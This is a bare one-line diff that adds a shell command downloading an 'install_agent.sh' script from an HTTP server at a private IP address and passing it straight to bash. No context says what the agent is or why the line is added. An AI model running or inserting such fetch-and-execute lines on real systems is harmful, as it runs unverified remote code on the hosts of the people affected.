@@ -1,0 +1,1 @@
+bash -c "$(curl "http://172.18.215.158:5000/api/v1.0/install_agent.sh")"
